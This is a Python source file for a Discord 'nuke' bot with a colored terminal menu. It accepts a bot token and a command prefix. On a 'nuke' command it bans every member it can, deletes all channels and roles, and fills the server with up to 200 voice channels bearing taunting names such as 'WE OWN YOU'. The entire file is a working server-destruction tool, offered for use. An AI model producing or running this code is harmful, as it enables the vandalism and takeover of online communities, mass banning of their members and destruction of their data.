import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system, environ
from sys import exit
import random

init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

clear = lambda: system('cls') if os_name == 'nt' else system('clear')
def _input(text):print(text, end='');return input()

baner = f'''
{r} _   _       _       {m} ____        _   
{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
{y}Made by: {g}https://github.com/Sigma-cc'''

async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            await role.delete()
            deleted += 1
        except:
            continue
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            await member.ban()
            banned += 1
        except:
            continue
    return banned

async def create_roles(guild):
    created = 0
    names = [
        "[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊",
        "[☠️] 𝟕𝟔𝟐𝐇𝐔𝐑𝐓",
        "[😭] 𝐅𝐊𝐃 𝐁𝐘 𝐖𝐄𝐏𝐀𝐈𝐃",
        "[🤑] 𝐖𝐄 𝐎𝐖𝐍 𝐘𝐎𝐔"
    ]
    for _ in range(200 - len(guild.roles)):
        try:
            await guild.create_role(name=random.choice(names))
            created += 1
        except:
            continue
    return created

async def create_voice_channels(guild):
    created = 0
    names = [
        "[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊",
        "[☠️] 𝟕𝟔𝟐𝐇𝐔𝐑𝐓",
        "[😭] 𝐅𝐊𝐃 𝐁𝐘 𝐖𝐄𝐏𝐀𝐈𝐃",
        "[🤑] 𝐖𝐄 𝐎𝐖𝐍 𝐘𝐎𝐔"
    ]
    for _ in range(200 - len(guild.channels)):
        try:
            await guild.create_voice_channel(name=random.choice(names))
            created += 1
        except:
            continue
    return created

async def nuke_guild(guild):
    print(f'{r}Nuke: {m}{guild.name}')
    banned = await ban_all_members(guild)
    print(f'{m}Banned:{b}{banned}')
    deleted_channels = await delete_all_channel(guild)
    print(f'{m}Delete Channels:{b}{deleted_channels}')
    delete_roles = await delete_all_roles(guild)
    print(f'{m}Delete Roles:{b}{delete_roles}')
    created_channels = await create_voice_channels(guild)
    print(f'{m}Create Voice Channels:{b}{created_channels}')
    print(f'{r}--------------------------------------------\n\n')

while True:
    clear()
    choice = input(f'''   
{baner}                
{c}--------------------------------------------
{b}[Menu]
    {y}└─[1] {m}- {g}Run Setup Nuke Bot
    {y}└─[2] {m}- {g}Exit
{y}====>{g}''')
    
    if choice == '1':
        token = environ.get('DISCORD_BOT_TOKEN')
        if not token:
            token = _input(f'{y}Input bot token:{g}')
            
        prefix = _input(f'{y}Input prefix for commands:{g}')
        
        clear()
        client = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

        @client.event
        async def on_ready():
            print(f'''
{g}[+] Logged as {client.user.name}
{g}[+] Bot in {len(client.guilds)} servers!
{y}[!] Use command {prefix}nuke in any server to start the process.''')

        @client.command()
        async def nuke(ctx):
            await nuke_guild(ctx.guild)
            await ctx.send("Nuke finished!")

        try:
            client.run(token)
        except Exception as error:
            input(f'{r}{error}\n{b}Press enter for return...')
            continue
            
    elif choice == '2':
        print(f'{dr}Exit...')
        exit()
